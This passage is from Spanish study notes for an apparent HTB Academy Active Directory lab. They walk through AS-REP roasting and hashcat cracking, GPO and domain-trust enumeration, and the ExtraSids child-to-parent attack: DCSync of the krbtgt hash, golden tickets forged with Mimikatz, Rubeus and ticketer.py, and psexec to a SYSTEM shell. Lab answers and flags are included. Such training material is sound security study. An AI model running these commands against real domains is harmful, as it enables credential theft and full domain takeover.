PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

[*] Action: AS-REP roasting

[*] Target User            : mmorgan
[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'
[*] SamAccountName         : mmorgan
[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D1...
```

Y luego, con el módulo `18200`, descifrar el hash con Hashcat.

##### Obteniendo el AS-REP usando Kerbrute

```shell
[!bash!]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop

2022/04/01 13:14:17 >  Using KDC(s):
2022/04/01 13:14:17 >  	172.16.5.5:88

2022/04/01 13:14:17 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda...

<SNIP>
```

Con una lista de usuarios válidos, **Get-NPUsers.py** (Impacket) permite identificar cuentas sin **preautenticación Kerberos**, obtener sus **AS-REP** para crackeo offline y, si no se logran romper, reportarlo igualmente como hallazgo de riesgo bajo.

```shell
[!bash!]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 

[-] User ccruz@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d51...
[-] User rramirez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### GPO Abuse

Las **Group Policy Objects (GPOs)** pueden fortalecer o comprometer un dominio. Si un atacante obtiene control sobre una GPO por una mala ACL, puede usarla para moverse lateralmente, escalar privilegios o mantener persistencia. Errores comunes permiten añadir privilegios, crear administradores locales o tareas programadas. Se pueden auditar y enumerar con **PowerView**, **BloodHound**, **group3r**, **ADRecon** o **PingCastle**.

##### Enumerando GPOs con PowerView

```powershell
PS C:\htb> Get-DomainGPO |select displayname
```

Esto permite identificar medidas de seguridad activas (bloqueo de cmd.exe, políticas de contraseñas separadas, uso de autologon con posibles credenciales visibles o presencia de AD CS). Si el equipo tiene las herramientas de administración de directivas instaladas, puede usarse **Get-GPO** para enumerar lo mismo.

##### Enumerando GPOs con un cmdlet

```powershell
PS C:\htb> Get-GPO -All | Select DisplayName
```

##### Enumeración de permisos de GPO para usuarios del dominio

```powershell
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             :
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
                        WriteOwner
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983095
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
AceType               : AccessAllowed
AceFlags              : ObjectInherit, ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit, ObjectInherit
PropagationFlags      : None
AuditFlags            : None
```

Aquí podemos ver que el grupo **Domain Users** tiene varios permisos sobre una GPO, como **WriteProperty** y **WriteDacl**, los cuales podríamos aprovechar para obtener control total sobre la GPO y ejecutar distintos ataques que se aplicarían a todos los usuarios y equipos de las UO donde esté vinculada. Podemos usar el **GUID** de la GPO junto con **Get-GPO** para ver su nombre visible.

##### Convirtiendo GPO GUID a Nombre

```powershell-session
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
```

Al revisar en **BloodHound**, podemos ver que el grupo **Domain Users** tiene varios permisos sobre la GPO **Disconnect Idle RDP**, lo que podría aprovecharse para obtener control total del objeto.

![[Pasted image 20251118074751.png | 800]]

Si seleccionamos la GPO en BloodHound y bajamos hacia `Affected Objects` en la pestaña `Node Info`, podemos ver que esta GPO está aplicada a un OU, que contiene 4 objetos ordenador:

![[Pasted image 20251118074915.png]]

Podríamos usar una herramienta como **SharpGPOAbuse** para explotar esta mala configuración de GPO realizando acciones como agregar nuestro usuario al grupo de administradores locales, crear una tarea programada que nos dé una _reverse shell_ o configurar un script de inicio malicioso. Sin embargo, hay que actuar con cuidado, ya que los cambios afectan a todos los equipos de la OU vinculada; por ejemplo, no sería prudente añadirse como administrador local en mil equipos a la vez. Algunas opciones del programa permiten limitar el ataque a un usuario o host concreto. Los equipos mostrados en el ejemplo no son vulnerables, y los ataques a GPO se tratarán con más detalle en otro módulo.

##### _Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y"._

> **Respuesta**: ygroce

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

##### _Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer._

> **Respuesta**: Pass@word

En primer lugar, habiendo importado previamente PowerView, obtenemos la lista de los usuarios que no tienen el Pre-Auth activado:

```powershell
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

Nos dará esta lista:

![[Pasted image 20251118080727.png]]

Posteriormente, utilizamos Rubeus.exe con asreproast para obtener el hash del usuario ygroce:

```powershell
PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

![[Pasted image 20251118081041.png]]

Desciframos el hash con hashcat:

```bash
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt

...:Pass@word
  
Session..........: hashcat
Status...........: Cracked
```

# Fundamentos de las confianzas de dominio

##### Escenario

Muchas organizaciones grandes adquieren con el tiempo nuevas empresas y las integran en su estructura. Una forma sencilla de hacerlo es establecer una **relación de confianza entre dominios** (_domain trust_) con el nuevo dominio. Esto evita tener que migrar todos los objetos existentes y acelera la integración. Sin embargo, estas confianzas también pueden introducir **debilidades** si no se gestionan correctamente: un subdominio con una vulnerabilidad puede servirnos como vía rápida para acceder al dominio principal. Las empresas también pueden establecer confianzas con **proveedores de servicios (MSP)**, **clientes** u **otras unidades de negocio** (por ejemplo, una delegación en otra región). A continuación, veremos con más detalle cómo funcionan las confianzas de dominio y cómo es posible **abusar de su funcionalidad interna** durante una auditoría o evaluación de seguridad.

### Visión general de las confianzas de dominio

Una **confianza (trust)** se utiliza para establecer autenticación entre **bosques (forest-forest)** o **dominios (domain-domain)**, permitiendo que los usuarios accedan a recursos o realicen tareas administrativas en otro dominio distinto de aquel donde reside su cuenta. La confianza enlaza los sistemas de autenticación de dos dominios y puede ser **unidireccional** o **bidireccional**.  
Una organización puede crear varios tipos de confianza:

- **Parent-child (padre-hijo):** entre dos o más dominios del mismo bosque. La confianza es bidireccional y transitiva; por ejemplo, los usuarios de _corp.inlanefreight.local_ pueden autenticarse en _inlanefreight.local_ y viceversa.    
- **Cross-link:** confianza entre dominios hijo para acelerar la autenticación.    
- **External (externa):** no transitiva, entre dominios de bosques distintos que no están unidos por una forest trust; utiliza **SID filtering** para limitar autenticaciones de dominios no confiables.    
- **Tree-root:** confianza bidireccional y transitiva entre el dominio raíz del bosque y un nuevo dominio raíz de árbol, creada automáticamente al agregar un nuevo árbol dentro del bosque.    
- **Forest (de bosque):** confianza transitiva entre los dominios raíz de dos bosques.    
- **ESAE:** bosque bastión (_bastion forest_) empleado para la administración segura de Active Directory.

Al establecer una **confianza**, ciertos parámetros pueden ajustarse según las necesidades del negocio. Las confianzas pueden ser **transitivas** o **no transitivas**.

Una **confianza transitiva** extiende la confianza a los objetos que el dominio hijo confía. Por ejemplo, si el **Dominio A** confía en el **Dominio B**, y el **Dominio B** tiene una confianza transitiva con el **Dominio C**, entonces el **Dominio A** también confiará automáticamente en el **Dominio C**.

En una **confianza no transitiva**, solo se confía directamente en el dominio especificado, sin extender la confianza a otros dominios intermedios.

![[Pasted image 20251118082015.png | 800]]

##### Tabla de confianza

| Transitivo                                                                     | No transitivo                                       |
| ------------------------------------------------------------------------------ | --------------------------------------------------- |
| Compartido, 1 a muchos                                                         | Confianza directa                                   |
| La confianza es compartida con cualquiera en el bosque                         | No se extiende al siguiente nivel de dominios hijos |
| Bosque, árbol-raíz, padre-hijo, y confianzas de enlace cruzado son transitivas | Típico en confianzas externas o personalizadas      |
Las confianzas pueden ser **unidireccionales** (solo un dominio accede al otro) o **bidireccionales** (ambos acceden entre sí). Si se configuran mal, pueden abrir **rutas de ataque críticas**, especialmente tras fusiones o adquisiciones donde el dominio adquirido tiene menor seguridad. Un atacante podría comprometer un dominio secundario y, desde ahí, obtener acceso administrativo al principal. Por eso, es clave evaluar la seguridad antes de establecer cualquier relación de confianza.

![[Pasted image 20251118083832.png | 700]]

### Enumerando relaciones de confianza

Podemos usar el cmdlet `GetAD-Trust` para enumerar relaciones de confianza en el dominio. Esto es especialmente de ayuda si estamos limitados a usar herramientas built-in.

##### Usando Get-ADTrust

```powershell
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *
```

El dominio **INLANEFREIGHT.LOCAL** tiene dos confianzas: una con su subdominio **LOGISTICS.INLANEFREIGHT.LOCAL** y otra con **FREIGHTLOGISTICS.LOCAL**, esta última de tipo _forest_ o _external_, ambas **bidireccionales**, permitiendo autenticación en ambos sentidos. Esto es clave para auditorías, ya que sin autenticación cruzada no hay enumeración posible. Las relaciones de confianza pueden verse con **PowerView (Get-DomainTrust)**, **BloodHound** o el módulo de PowerShell de AD.

##### Comprobar confianzas existentes usando Get-DomainTrust

```powershell-session
PS C:\htb> Get-DomainTrust 

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM
```

**PowerView** permite mapear las confianzas de dominio y mostrar su tipo (padre/hijo, externa o de bosque) y dirección (unidireccional o bidireccional). Esta información resulta útil una vez obtenido un punto de acceso para planificar la expansión del compromiso en el entorno.

##### Usando Get-DomainTrustMapping

```powershell-session
PS C:\htb> Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM
...SNIP...
```

Desde aquí, podríamos comenzar a enumerar a través de las confianzas. Por ejemplo, comprobar todos los usuarios en el dominio hijo:

##### Comprobando usuarios en el dominio hijo usando Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

samaccountname
--------------
htb-student_adm
Administrator
Guest
lab_adm
krbtgt
```

Otra herramienta útil es **netdom**. Con el subcomando `netdom query`, podemos obtener información del dominio, como la lista de equipos, servidores y **relaciones de confianza** configuradas.

```cmd
C:\htb> netdom query /domain:inlanefreight.local trust
Direction Trusted\Trusting domain                         Trust type
========= =======================                         ==========

<->       LOGISTICS.INLANEFREIGHT.LOCAL                   Direct
 Not found 

<->       FREIGHTLOGISTICS.LOCAL                          Direct
 Not found

The command completed successfully.
```

**Usando netdom para comprobar controladores de dominio**

```cmd-session
C:\htb> netdom query /domain:inlanefreight.local dc
List of domain controllers with accounts in the domain:

ACADEMY-EA-DC01
The command completed successfully.
```

**Usando netdom para comprobar servidores y workstations**

```cmd-session
C:\htb> netdom query /domain:inlanefreight.local workstation
List of workstations with accounts in the domain:

ACADEMY-EA-MS01
ACADEMY-EA-MX01      ( Workstation or Server )
...SNIP...
```

También podemos usar **BloodHound** para visualizar las relaciones de confianza mediante la consulta predefinida **Map Domain Trusts**, donde se muestra claramente la existencia de dos confianzas bidireccionales.

##### _What is the child domain of INLANEFREIGHT.LOCAL? (format: FQDN, i.e., DEV.ACME.LOCAL)_

> **Respuesta**: LOGISTICS.INLANEFREIGHT.LOCAL

![[Pasted image 20251118090134.png]]

Lo tenemos justo ahí
##### _What domain does the INLANEFREIGHT.LOCAL domain have a forest transitive trust with?_

> **Respuesta**: FREIGHTLOGISTICS.LOCAL

![[Pasted image 20251118090701.png]]
##### _What direction is this trust?_

> **Respuesta**: Bidirectional

# Atacando confianzas de dominio - Confianzas hijo → padre (Windows)

##### Introducción a SID History

El atributo **sidHistory** permite que, tras migrar un usuario a otro dominio, siga accediendo a los recursos del dominio original. Un atacante puede abusar de esto con **Mimikatz**, inyectando el SID de un **Domain Admin** en la _sidHistory_ de una cuenta bajo su control. Al iniciar sesión, el token del usuario incluirá ese SID, otorgándole privilegios de administrador, permitiendo ejecutar **DCSync** o crear **Golden Tickets** para mantener acceso persistente.
##### ExtraSids Attack - Mimikatz

El **ataque ExtraSIDs** permite comprometer el dominio padre tras vulnerar el hijo, aprovechando que dentro del mismo bosque no hay **SID Filtering**. Con **Mimikatz**, se modifica el atributo _sidHistory_ de una cuenta del dominio hijo para añadir el **SID de Enterprise Admins** del dominio raíz, obteniendo acceso total al bosque sin pertenecer realmente al grupo.  
Para ello se necesitan el **hash KRBTGT**, el **SID del dominio hijo**, el **usuario objetivo** (real o no), el **FQDN del dominio hijo** y el **SID de Enterprise Admins**. Con el hash KRBTGT —obtenido mediante **DCSync** tras comprometer el dominio hijo— se puede crear un **Golden Ticket** y tomar control del dominio padre.

##### Obteniendo el hash NT de la cuenta KRBTGT usando Mimikatz

```powershell
PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 11:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e
```

Podemos usar la función `Get-DomainSID` para obtener el SID para el dominio hijo, pero esto también es visible con Mimikatz como se puede ver arriba.
##### Usando Get-DomainSID

```powershell-session
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```

A continuación, podemos usar **Get-DomainGroup** de **PowerView** para obtener el **SID** del grupo **Enterprise Admins** en el dominio padre. También puede hacerse con PowerShell usando:  
`Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`.

```powershell
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid                                    
-----------------                                       ---------                                    
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

En este punto tenemos los siguientes datos:

- **Hash KRBTGT** del dominio hijo: `9d765b482771505cbe97411065964d5f`    
- **SID** del dominio hijo: `S-1-5-21-2806153819-209893948-922872689`    
- **Usuario objetivo** (puede no existir): `hacker`    
- **FQDN** del dominio hijo: `LOGISTICS.INLANEFREIGHT.LOCAL`    
- **SID** del grupo **Enterprise Admins** del dominio raíz: `S-1-5-21-3842939050-3880317879-2865463114-519`    

Antes del ataque, se confirma que **no hay acceso** al sistema de archivos del **controlador de dominio padre**.

```powershell-session
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
```

Usando Mimikatz y los datos listados arriba podemos crear un Golden Ticket para acceder a todos los recursos del dominio padre
##### Creando un Golden Ticket con Mimikatz

```powershell
PS C:\htb> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

Podemos confirmar que el ticket Kerberos para el usuario `hacker` (que no existe) está residiendo en memoria utilizando `klist`. Desde aquí, es posible acceder a cualquier recurso dentro del dominio padre, y podríamos comprometerlo de diferentes formas, como listar todo el directorio C:\ del DC.
### ExtraSids Attack - Rubeus

También podemos realizar este ataque usando Rubeus. Primero, igual que antes, debemos confirmar que no podemos acceder al sistema de ficheros del DC

```powershell-session
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAcces 
   sException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
	
```

Después, formularemos nuestro comando Rubeus usando la información que obtuvimos más arriba. La flag `/rc4` es el hash NT de la cuenta KRBTGT. La flag `/sids` le dirá a Rubeus que cree nuestro Golden Ticket dándonos los mismos privilegios que los miembros del grupo Enterprise Admins en el dominio padre.

##### Creando un Golden Ticket usando Rubeus

```powershell
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

..SNIP..

[+] Ticket successfully imported!
```

> `/ptt` indica Pass the Ticket

Igual que antes, podemos confirmar que el ticket está en memoria usando el comando `klist`

##### Realizando un ataque DCSync

```powershell
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
```

Cuando trabajamos con varios dominios y el dominio objetivo **no coincide** con el del usuario, debemos **especificar el dominio exacto** al realizar la operación **DCSync** sobre el controlador de dominio deseado.

```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

##### _What is the SID of the child domain?

> **Respuesta:** S-1-5-21-2806153819-209893948-922872689

Simplemente desde PowerShell:

```powershell
Import-Module .\PowerView.ps1
Get-DomainSID
```

Y nos dará el SID.
##### _What is the SID of the Enterprise Admins group in the root domain?_

> **Respuesta:** S-1-5-21-3842939050-3880317879-2865463114-519

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
##### _Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain_

> **Respuesta:** f@ll1ng_l1k3_d0m1no3$

Primero obtenemos el hash de la cuenta KRBTGT. 

```powershell
.\mimikatz.exe
lsadump::dcsync /user:LOGISTICS\krbtgt
```

Una vez obtenemos el hash, el SID del grupo de administradores Enterprise, y el SID del dominio hijo, podemos crear el golden ticket

```powershell
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

![[Pasted image 20251118134954.png]]

Al tenerlo en memoria podemos obtener la flag fácilmente.

```bash
cat \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
```
# Atacando confianzas de dominio - Confianzas hijo → padre (Linux)

También puede realizarse el ataque desde un host Linux, reuniendo los mismos datos: **hash KRBTGT**, **SID del dominio hijo**, **usuario objetivo**, **FQDN** y **SID de Enterprise Admins** del dominio raíz.  
Con control total del dominio hijo (_LOGISTICS.INLANEFREIGHT.LOCAL_), se usa **secretsdump.py** para ejecutar **DCSync** y obtener el **hash NTLM** de la cuenta **KRBTGT**.

##### Realizando un DCSync con `secretsdump.py`

```shell
$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
krbtgt:des-cbc-md5:fee04c3d026d7538
[*] Cleaning up...
```

Luego podemos usar **lookupsid.py** de **Impacket** para forzar SIDs y obtener el **SID del dominio hijo**. Indicando la IP del **controlador de dominio** como destino, la herramienta devuelve el SID del dominio y los **RIDs** de usuarios y grupos. Por ejemplo, el usuario _lab_adm_ tendría el SID **S-1-5-21-2806153819-209893948-922872689-1001**.

##### Realizando fuerza bruta de SIDs usando `lookupsid.py`

```shell
$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 172.16.5.240
[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```

Podemos filtrar el ruido enviando la salida del comando a **grep** y mostrando solo el **SID del dominio**. Para buscar el SID del dominio:

```shell
$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

Password:

[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```

A continuación, podemos volver a ejecutar el comando apuntando al **controlador de dominio INLANEFREIGHT (DC01)** en **172.16.5.5**, obtener el **SID del dominio** (`S-1-5-21-3842939050-3880317879-2865463114`) y añadirle el **RID** del grupo **Enterprise Admins**.  

##### Obteniendo el SID del dominio y adjuntando el RID del grupo Enterprise Admins

```shell
amr251@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

Password:
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\administrator (SidTypeUser)
501: INLANEFREIGHT\guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

Con los datos reunidos —**hash KRBTGT**, **SID del dominio hijo**, **usuario hacker**, **FQDN** y **SID de Enterprise Admins**— podemos usar **ticketer.py** de **Impacket** para generar un **Golden Ticket** válido tanto en el **dominio hijo** como en el **padre** mediante las opciones `-domain-sid` y `-extra-sid`.

##### Construyendo un Golden Ticket usando `ticketer.py`

```shell
$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

El ticket será guardado en nuestro sistema como un archivo `ccache`, que se usa para almacenar credenciales Kerberos. Estableciendo la variable de entorno `KRB5CCNAME` le dice al sistema que use dicho archivo para los intentos de autenticación.

```shell
$ export KRB5CCNAME=hacker.ccache 
```

Podemos comprobar si la autenticación al **controlador de dominio padre** es exitosa usando la versión de **Psexec** incluida en **Impacket**. Si funciona, obtendremos una **shell con privilegios SYSTEM** en el controlador de dominio objetivo.

```shell
$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.5.5.....
[*] Found writable share ADMIN$
[*] Uploading file nkYjGWDZ.exe
[*] Opening SVCManager on 172.16.5.5.....
[*] Creating service eTCU on 172.16.5.5.....
[*] Starting service eTCU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

**Impacket** incluye la herramienta **raiseChild.py**, que automatiza la **escalada de dominio hijo a dominio padre**. Solo hay que indicar el **controlador de dominio objetivo** y las **credenciales de un administrador del dominio hijo**.  
